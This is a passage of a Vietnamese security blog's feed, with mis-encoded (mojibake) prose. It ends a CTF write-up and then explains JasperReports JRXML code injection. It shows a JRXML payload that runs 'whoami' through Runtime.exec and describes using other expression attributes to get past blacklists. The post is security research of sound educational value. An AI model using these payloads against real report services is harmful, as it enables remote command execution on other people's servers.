&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;sc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/r1VF57_g-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Finally, RCE:&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/rkD95Xdx-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äá»›p flag trÃªn server:&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/r13xo7ugbl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ra Ä‘áº¿n bÆ°á»›c nÃ y thÃ¬ cuá»™c thi cÅ©ng káº¿t thÃºc rá»“i, thÃ´i thÃ¬ +1 kiáº¿n thá»©c váº­y&lt;/p&gt;
&lt;h2 id="káº¿t-thÃºc"&gt;Káº¿t thÃºc
&lt;/h2&gt;&lt;p&gt;Trong khoáº£ng thá»i gian 8 tiáº¿ng, ngoÃ i challenge web2 thÃ¬ mÃ¬nh cÃ³ vá»c Lucky Star ná»¯a mÃ  khÃ´ng confirm Ä‘Æ°á»£c Ä‘Ã£ RCE con Sharepoint hay chÆ°a, coi nhÆ° lÃ  tá»‘n thÃªm thá»i gian mÃ  khÃ´ng cÃ³ thÃ nh quáº£ gÃ¬.
Ngáº­m ngÃ¹i káº¿t thÃºc á»Ÿ vá»‹ trÃ­ thá»© 6, mÃ¬nh cÅ©ng chá»‰ biáº¿t tá»± trÃ¡ch báº£n thÃ¢n thÃ´i ğŸ—¿
&lt;img src="https://hackmd.io/_uploads/S1PUdlulZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ÄÃ¢y lÃ  bÃ i há»c cho báº£n thÃ¢n vá» viá»‡c khÃ´ng chuáº©n bá»‹ kÄ© trÆ°á»›c má»™t format thi má»›i, cÅ©ng nhÆ° sá»± thiáº¿u quyáº¿t Ä‘oÃ¡n khi sá»­ dá»¥ng tool unshield,&amp;hellip; dáº«n Ä‘áº¿n káº¿t quáº£ khÃ´ng nhÆ° mong muá»‘n. Hi vá»ng ráº±ng cÃ¡c khÃ³a sau sáº½ khÃ´ng máº¯c pháº£i sai láº§m nhÆ° mÃ¬nh ná»¯a.&lt;/p&gt;</description></item><item><title>Jasper Injection</title><link>https://kev1n1203.github.io/p/jasper-injection/</link><pubDate>Tue, 11 Mar 2025 14:59:21 +0000</pubDate><guid>https://kev1n1203.github.io/p/jasper-injection/</guid><description>&lt;p&gt;Khi Ä‘Æ°á»£c tiáº¿p xÃºc vá»›i cÃ¡c há»‡ thá»‘ng code báº±ng Java, mÃ¬nh tháº¥y cÃ³ khÃ¡ nhiá»u website sá»­ dá»¥ng thÆ° viá»‡n JasperReports trong viá»‡c render bÃ¡o cÃ¡o. Tuy lÃ  má»™t cÃ´ng cá»¥ máº¡nh máº½ nhÆ°ng Japser sá»Ÿ há»¯u function mÃ  cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ RCE. NÃªn mÃ¬nh quyáº¿t Ä‘á»‹nh mÃ y mÃ² nÃ³ má»™t chÃºt, cÅ©ng nhÆ° chia sáº» nhá»¯ng kiáº¿n thá»©c mÃ  mÃ¬nh biáº¿t vÃ  tÃ¬m hiá»ƒu Ä‘Æ°á»£c Ä‘Æ°á»£c vá» Jasper.&lt;/p&gt;
&lt;h2 id="code-injection-in-jasper"&gt;Code Injection In Jasper
&lt;/h2&gt;&lt;h3 id="má»™t-chÃºt-khÃ¡i-niá»‡m"&gt;Má»™t chÃºt khÃ¡i niá»‡m
&lt;/h3&gt;&lt;p&gt;Jasper lÃ  má»™t thÆ° viá»‡n cÃ³ má»¥c Ä‘Ã­ch chÃ­nh dÃ¹ng Ä‘á»ƒ render ná»™i dung. ÄÆ°á»£c sá»­ dá»¥ng chá»§ yáº¿u cho viá»‡c chuyá»ƒn Ä‘á»•i tá»« file cÃ³ cáº¥u trÃºc sang vÄƒn báº£n bÃ¡o cÃ¡o, cÃ³ thá»ƒ xuáº¥t ra vá»›i nhiá»u Ä‘á»‹nh dáº¡ng khÃ¡c nhau nhÆ°: PDF, HTML, Excel,&amp;hellip;
Jasper há»— trá»£ nhiá»u file Ä‘áº§u vÃ o:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JRXML: file XML vá»›i cÃ¡c attribute cá»§a jasper&lt;/li&gt;
&lt;li&gt;JASPER: file Ä‘Æ°á»£c compile tá»« jrxml&lt;/li&gt;
&lt;li&gt;CSV, JSON, XML,&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Trong pháº¡m vi bÃ i viáº¿t, mÃ¬nh sáº½ Ä‘á» cáº­p Ä‘áº¿n chá»©c nÄƒng phá»• biáº¿n khi sá»­ dá»¥ng thÆ° viá»‡n JasperReports mÃ  mÃ¬nh hay gáº·p nháº¥t, Ä‘Ã³ lÃ  chuyá»ƒn Ä‘á»•i file JRXML sang Ä‘á»‹nh dáº¡ng PDF.&lt;/p&gt;
&lt;h3 id="cáº¥u-trÃºc-file-jrxml"&gt;Cáº¥u trÃºc file JRXML
&lt;/h3&gt;&lt;p&gt;NhÆ° mÃ¬nh Ä‘Ã£ nÃ³i á»Ÿ trÃªn, file JRXML cÆ¡ báº£n lÃ  má»™t file XML nhÆ°ng cÃ¡c attribute sáº½ tuÃ¢n theo tiÃªu chuáº©n cá»§a má»™t Jasper Template, nÃªn ta cÅ©ng sáº½ cÃ³ tag &lt;code&gt;&amp;lt;?xml&amp;gt;&lt;/code&gt; nhÆ° bao file XML khÃ¡c.
Tháº» root cá»§a má»™t file JRXML sáº½ lÃ  &lt;code&gt;&amp;lt;jasperReport&amp;gt;&lt;/code&gt;, trong tháº» Ä‘Ã³ ta sáº½ khai bÃ¡o nhá»¯ng thuá»™c tÃ­nh cÆ¡ báº£n cá»§a report nhÆ° in dá»c hay ngang, ngÃ´n ngá»¯ sá»­ dá»¥ng, tÃªn bÃ¡o cÃ¡o, Ä‘á»“ng thá»i cÃ³ thÃªm má»™t vÃ i XSD references. NhÆ°ng vá» cÆ¡ báº£n thÃ¬ ta chá»‰ cáº§n thuá»™c tÃ­nh name lÃ  Ä‘á»§, cÃ¡c thuá»™c tÃ­nh cÃ²n láº¡i lÃ  tÃ¹y chá»n, cÃ³ thá»ƒ cÃ³ cÅ©ng cÃ³ thá»ƒ khÃ´ng.
BÃªn trong tháº» root, ta cÃ³ thá»ƒ chÃ¨n vÃ o cÃ¡c tháº» khÃ¡c nhau Ä‘á»ƒ biá»ƒu Ä‘áº¡t ná»™i dung cá»§a bÃ¡o cÃ¡o, tá»« cÃ¡c label hoáº·c chá»¯ cá»‘ Ä‘á»‹nh Ä‘áº¿n cÃ¡c biáº¿n cÃ³ giÃ¡ trá»‹ thay Ä‘á»•i, cÅ©ng nhÆ° cÃ³ thá»ƒ chÃ¨n vÃ o hÃ¬nh áº£nh, format báº£ng, chá»©c nÄƒng tÃ­nh toÃ¡n,&amp;hellip;
Má»™t file JRXML in ra chá»¯ Hello World Ä‘áº¡i khÃ¡i sáº½ nhÆ° nÃ y:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;jasperReport name=&amp;#34;hello&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;detail&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;band height=&amp;#34;50&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;staticText&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;reportElement x=&amp;#34;200&amp;#34; y=&amp;#34;10&amp;#34; width=&amp;#34;200&amp;#34; height=&amp;#34;30&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;textElement textAlignment=&amp;#34;Center&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/textElement&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;text&amp;gt;&amp;lt;![CDATA[Hello World]]&amp;gt;&amp;lt;/text&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/staticText&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/band&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/detail&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/jasperReport&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Chi tiáº¿t vá» cÃ¡c attribute sá»­ dá»¥ng trong JasperReport cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o táº¡i &lt;a class="link" href="https://jasperreports.sourceforge.net/JasperReports-Ultimate-Guide-3.pdf" target="_blank" rel="noopener"
&gt;Jasper document&lt;/a&gt; . Thay vÃ o Ä‘Ã³, mÃ¬nh sáº½ Ä‘i vÃ o tÃ­nh nÄƒng khiáº¿n cho Jasper trá»Ÿ thÃ nh cÃ´ng cá»¥ render report máº¡nh máº½, Ä‘Ã³ lÃ  Expressions.&lt;/p&gt;
&lt;h3 id="expressions"&gt;Expressions
&lt;/h3&gt;&lt;h4 id="kiáº¿n-thá»©c-ná»n-táº£ng"&gt;Kiáº¿n thá»©c ná»n táº£ng
&lt;/h4&gt;&lt;p&gt;LÃ  má»™t tÃ­nh nÄƒng máº¡nh máº½ Jasper cung cáº¥p cho ngÆ°á»i dÃ¹ng, cÃ¡c expression (cÃ³ thá»ƒ dá»‹ch ra lÃ  cÃ¡c biá»ƒu thá»©c, cÃ¡c mÃ´ táº£) Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ khai bÃ¡o biáº¿n trong bÃ¡o cÃ¡o, cÅ©ng nhÆ° há»— trá»£ xá»­ lÃ½ cÃ¡c biáº¿n Ä‘Ã³ má»™t cÃ¡ch linh hoáº¡t tá»« hiá»ƒn thá»‹ cho Ä‘áº¿n tÃ­nh toÃ¡n. Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³, cÃ¡c expression sáº½ Ä‘Æ°á»£c viáº¿t báº±ng ngÃ´n ngá»¯ láº­p trÃ¬nh, mÃ  máº·c Ä‘á»‹nh trong Jasper sáº½ lÃ  Java code.
Vá»«a lÃ  tÃ­nh nÄƒng cÃ³ thá»ƒ giÃºp viá»‡c xá»­ lÃ½ dá»¯ liá»‡u in ra trÃªn bÃ¡o cÃ¡o Ä‘Æ°á»£c trá»±c quan vÃ  dá»… dÃ ng, nhÆ°ng cÅ©ng vá»«a lÃ  nÆ¡i Ä‘á»ƒ chÃ¨n code tÃ¹y Ã½. Tuy nhiÃªn cÃ³ má»™t lÆ°u Ã½ ráº±ng code truyá»n vÃ o bÃªn trong cÃ¡c expression cáº§n pháº£i tráº£ vá» má»™t kiá»ƒu dá»¯ liá»‡u nháº¥t Ä‘á»‹nh Ä‘á»ƒ hoáº¡t Ä‘á»™ng, náº¿u khÃ´ng sáº½ gÃ¢y lá»—i khi render.
CÃ¡c expression nÃ y sáº½ Ä‘Æ°á»£c trigger trong quÃ¡ trÃ¬nh render file JRXML sang PDF. Náº¿u khÃ´ng cÃ³ cÆ¡ cháº¿ phÃ²ng thá»§ phÃ¹ há»£p, mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ khai thÃ¡c lá»—i code injection Ä‘á»ƒ RCE, Ä‘á»c táº£i file,&amp;hellip;&lt;/p&gt;
&lt;h4 id="vÃ­-dá»¥"&gt;VÃ­ dá»¥
&lt;/h4&gt;&lt;p&gt;Äá»ƒ vÃ­ dá»¥ thÃªm trá»±c quan, mÃ¬nh cÃ³ má»™t Ä‘oáº¡n code spring Ä‘Æ¡n giáº£n, phá»¥c vá»¥ viá»‡c upload 1 file JRXML vÃ  tráº£ vá» file report.pdf
MÃ¬nh sá»­ dá»¥ng Jasper phiÃªn báº£n 6.21.4 lÃ  ver má»›i nháº¥t cá»§a dÃ²ng 6., vÃ¬ mÃ¬nh tháº¥y dÃ²ng 6. hiá»‡n Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u nháº¥t.
&lt;img src="https://hackmd.io/_uploads/BykfHMEnJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sá»­ dá»¥ng luÃ´n vÃ­ dá»¥ bÃªn trÃªn, thay vÃ¬ sá»­ dá»¥ng tháº» &lt;code&gt;&amp;lt;text&amp;gt;&lt;/code&gt; Ä‘á»ƒ hiá»ƒn thá»‹ ná»™i dung tÄ©nh trong field &lt;code&gt;&amp;lt;staticText&amp;gt;&lt;/code&gt;, mÃ¬nh sáº½ sá»­ dá»¥ng tháº» &lt;code&gt;&amp;lt;textFieldExpression&amp;gt;&lt;/code&gt; dÃ¹ng Ä‘á»ƒ diá»…n Ä‘áº¡t ná»™i dung bÃªn trong tháº» &lt;code&gt;&amp;lt;textField&amp;gt;&lt;/code&gt;, Ä‘áº¡i khÃ¡i lÃºc nÃ y file JRXML sáº½ nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;jasperReport name=&amp;#34;1337&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;detail&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;band height=&amp;#34;50&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;textField&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;reportElement x=&amp;#34;200&amp;#34; y=&amp;#34;10&amp;#34; width=&amp;#34;200&amp;#34; height=&amp;#34;30&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;textFieldExpression&amp;gt;&amp;lt;![CDATA[new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(&amp;#34;whoami&amp;#34;).getInputStream())).readLine()]]&amp;gt;&amp;lt;/textFieldExpression&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/textField&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/band&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;/detail&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/jasperReport&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/Hkf4HfEnyl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº£i file PDF vá» vÃ  output cÃ¢u lá»‡nh sáº½ hiá»ƒn thá»‹ ra ngoÃ i:
&lt;img src="https://hackmd.io/_uploads/rkv90a7h1l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NgoÃ i cÃ¡ch táº¥n cÃ´ng nÃ y ra thÃ¬ má»™t sá»‘ bÃ i viáº¿t trÃªn máº¡ng thÃ¬ Ä‘a sá»‘ há» sáº½ táº¥n cÃ´ng vÃ o tháº» &lt;code&gt;&amp;lt;variableExpression&amp;gt;&lt;/code&gt; trong quÃ¡ trÃ¬nh khai bÃ¡o biáº¿n &lt;code&gt;&amp;lt;variable&amp;gt;&lt;/code&gt;, nÃªn mÃ¬nh sáº½ khÃ´ng nháº¯c Ä‘áº¿n nÃ³ ná»¯a, mÃ¬nh sáº½ Ä‘á»ƒ chÃºng á»Ÿ trong pháº§n ref Ä‘á»ƒ cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm.&lt;/p&gt;
&lt;h2 id="bypasses"&gt;Bypasses
&lt;/h2&gt;&lt;p&gt;Giáº£ sá»­ nhÆ° dev giá» Ä‘Ã£ biáº¿t Ä‘Æ°á»£c táº§m nghiÃªm trá»ng cá»§a váº¥n Ä‘á» vÃ  cÃ³ má»™t sá»‘ biá»‡n phÃ¡p phÃ²ng thá»§, mÃ¬nh sáº½ Ä‘Æ°a ra má»™t sá»‘ phÆ°Æ¡ng phÃ¡p cÃ³ thá»ƒ bypass cÆ¡ cháº¿ phÃ²ng thá»§ nhÆ° sau:&lt;/p&gt;
&lt;h3 id="expression-attribute"&gt;Expression Attribute
&lt;/h3&gt;&lt;p&gt;HÆ°á»›ng Ä‘áº§u tiÃªn mÃ  mÃ¬nh nghÄ© Ä‘áº¿n trong cÃ¡c trick bypass Ä‘Ã³ lÃ  sá»­ dá»¥ng cÃ¡c tháº» khÃ¡c ngoÃ i nhá»¯ng tháº» Ä‘Ã£ cÃ³ sáºµn payload trÃªn máº¡ng. JasperReports cÃ³ kha khÃ¡ cÃ¡c expression khÃ¡c mÃ  mÃ¬nh cÃ³ thá»ƒ lá»£i dá»¥ng, vÃ¬ báº£n thÃ¢n trÆ°á»ng dá»¯ liá»‡u nÃ o cÅ©ng cáº§n cÃ³ nhu cáº§u hiá»ƒn thá»‹ vÃ  xá»­ lÃ½ dá»¯ liá»‡u linh hoáº¡t.
Ta cÃ³ thá»ƒ sá»­ dá»¥ng attribute defaultValueExpression bÃªn trong tháº» &lt;code&gt;&amp;lt;parameter&amp;gt;&lt;/code&gt;, rá»“i call táº¡i tháº» textField quen thuá»™c. Äá»ƒ call Ä‘áº¿n param, trong textFieldExpression mÃ¬nh sáº½ sá»­ dá»¥ng cÃº phÃ¡p &lt;code&gt;$P{TÃªn param}&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/SyuawfNh1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i tháº» variable thÃ¬ cÃ²n má»™t expression ná»¯a ngoÃ i variableExpression lÃ  initialValueExpression cÅ©ng cÃ³ thá»ƒ chÃ¨n code, call Ä‘áº¿n variable thÃ´ng qua syntax &lt;code&gt;$V{TÃªn variable}&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/SkZ-FfNhyl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Má»™t lÆ°u Ã½ nhá» lÃ  Ä‘á»ƒ in ra giÃ¡ trá»‹ variable thÃ¬ textfield sáº½ Ä‘Æ°á»£c khai bÃ¡o bÃªn trong tháº» &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;, náº¿u sá»­ dá»¥ng &lt;code&gt;&amp;lt;detail&amp;gt;&lt;/code&gt; sáº½ luÃ´n hiá»ƒn thá»‹ giÃ¡ trá»‹ null
&lt;img src="https://hackmd.io/_uploads/ByX33fN2Je.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/BkQkTzEhJx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ² máº«m document, mÃ¬nh tháº¥y náº¿u nhÆ° khÃ´ng nháº¥t thiáº¿t pháº£i láº¥y output cá»§a cÃ¢u lá»‡nh thÃ¬ tá»“n táº¡i má»™t sá»‘ Expression Ä‘áº·c thÃ¹ cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ RCE, nhÆ°ng nÃ³ sáº½ gÃ¢y ra lá»—i. Attribute imageExpression thuá»™c tháº» &lt;code&gt;&amp;lt;image&amp;gt;&lt;/code&gt; vá»‘n Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Jasper cÃ³ thá»ƒ láº¥y áº£nh tá»« má»™t URL xÃ¡c Ä‘á»‹nh dáº¡ng String, khi khÃ´ng Ä‘Ã¡p á»©ng Ä‘Ãºng dá»¯ liá»‡u yÃªu cáº§u, cÃ¢u lá»‡nh sáº½ tráº£ vá» lá»—i nÃªn mÃ¬nh váº«n cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c cÃ¢u lá»‡nh blind Ä‘á»ƒ confirm.
Táº¡i Ä‘Ã¢y vÃ¬ mÃ¬nh truyá»n vÃ o Runtime.getRuntime().exec(), output tráº£ vá» sáº½ lÃ  má»™t object thuá»™c ProcessImpl nÃªn chÆ°Æ¡ng trÃ¬nh sáº½ vÄƒng ra lá»—i nhÆ° sau:
&lt;img src="https://hackmd.io/_uploads/BJXTSDNnkx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u nhÆ° set up Ä‘á»ƒ cÃ¢u lá»‡nh tráº£ vá» dá»¯ liá»‡u, Jasper khi cá»‘ gáº¯ng truy cáº­p URL Ä‘á»ƒ láº¥y byte áº£nh vá» tháº¥t báº¡i cÅ©ng sáº½ vÄƒng ra lá»—i, tuy nhiÃªn mÃ¬nh tháº¥y extract thÃ´ng tin 1 dÃ²ng thÃ¬ cÃ³ váº» khÃ´ng giÃ²n láº¯m:
&lt;img src="https://hackmd.io/_uploads/rJRUIP4h1l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p Ä‘áº¿n lÃ  attribute printWhenExpression cÃ³ thá»ƒ Ä‘Æ°á»£c khai bÃ¡o trong tháº» &lt;code&gt;&amp;lt;band&amp;gt;&lt;/code&gt; hoáº·c &lt;code&gt;&amp;lt;reportElement&amp;gt;&lt;/code&gt;, sá»­ dá»¥ng khi ta chá»‰ muá»‘n dá»¯ liá»‡u Ä‘Æ°á»£c in ra theo má»™t Ä‘iá»u kiá»‡n nháº¥t Ä‘á»‹nh, nÃªn nÃ³ yÃªu cáº§u cáº§n tráº£ vá» giÃ¡ trá»‹ kiá»ƒu Boolean hoáº·c giÃ¡ trá»‹ null. Viá»‡c truyá»n java code vÃ o attribute nÃ y cÅ©ng sáº½ gÃ¢y lá»—i lÃºc render PDF nÃªn ta Æ°u tiÃªn báº±ng má»™t sá»‘ cÃ¢u lá»‡nh blind nhÆ° curl, ping,&amp;hellip;
&lt;img src="https://hackmd.io/_uploads/HJHsvwVnyx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/S1ZTvPNnkx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Attribute conditionExpression thuá»™c tháº» &lt;code&gt;&amp;lt;style&amp;gt; -&amp;gt; &amp;lt;conditionalStyle&amp;gt;&lt;/code&gt; cÃ³ tÃ¡c dá»¥ng mÃ´ táº£ Ä‘iá»u kiá»‡n Ä‘á»ƒ Ã¡p dá»¥ng má»™t style cho dá»¯ liá»‡u cá»¥ thá»ƒ, cÅ©ng yÃªu cáº§u dá»¯ liá»‡u tráº£ vá» Boolean. Äá»ƒ trigger Ä‘Æ°á»£c Ä‘iá»u kiá»‡n nÃ y, ta cáº§n má»™t element trong file JRXML Ã¡p dá»¥ng style Ä‘Ã£ inject, táº¡i Ä‘Ã¢y mÃ¬nh PoC vá»›i tháº» textField cho tiá»‡n:
&lt;img src="https://hackmd.io/_uploads/H1WDiwE3yx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u nhÆ° ta muá»‘n thay Ä‘á»•i cÃ¡ch hiá»ƒn thá»‹ cá»§a má»™t vÃ¹ng dá»¯ liá»‡u, ta cÃ³ thá»ƒ sá»­ dá»¥ng propertyExpression Ä‘á»ƒ mÃ´ táº£ Ä‘iá»u kiá»‡n cÅ©ng nhÆ° quy Ä‘á»‹nh cÃ¡ch biáº¿n Ä‘á»•i. Äá»“ng thá»i cÅ©ng lÃ  má»™t nÆ¡i Ä‘á»ƒ chÃ¨n code. Tuy tráº£ vá» kiá»ƒu String, expression nÃ y khÃ´ng pháº£i lÃ  má»™t giÃ¡ trá»‹ hiá»ƒn thá»‹ mÃ  chá»‰ cÃ³ thá»ƒ thiáº¿t láº­p thuá»™c tÃ­nh cho giÃ¡ trá»‹ Ä‘Ã³. Khi sá»­ dá»¥ng mÃ¬nh váº«n nÃªn Æ°u tiÃªn cÃ¡c cÃ¢u lá»‡nh out bound Ä‘á»ƒ confirm bug sáº½ tá»‘t hÆ¡n:
&lt;img src="https://hackmd.io/_uploads/Hkt-guVh1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NgoÃ i nhá»¯ng expression mÃ¬nh Ä‘Ã£ liá»‡t kÃª cÃ¡ch khai thÃ¡c á»Ÿ bÃªn trÃªn, váº«n cÃ²n nhiá»u cÃ¡c expression khÃ¡c nhÆ°: dataSourceExpression, filterExpression, anchorNameExpression,&amp;hellip; Má»—i loáº¡i sáº½ Ä‘Æ°á»£c trigger trong má»™t tháº» vÃ  dÆ°á»›i Ä‘iá»u kiá»‡n cá»¥ thá»ƒ, cÃ¡c báº¡n cÃ³ thá»ƒ tÃ¹y vÃ o luá»“ng nghiá»‡p vá»¥ cá»§a bÃ¡o cÃ¡o Ä‘á»ƒ Ä‘a dáº¡ng hÃ³a nÆ¡i chÃ¨n code, bypass cÃ¡c blacklist náº¿u cÃ³.&lt;/p&gt;
&lt;h3 id="jasper-compiler"&gt;Jasper compiler
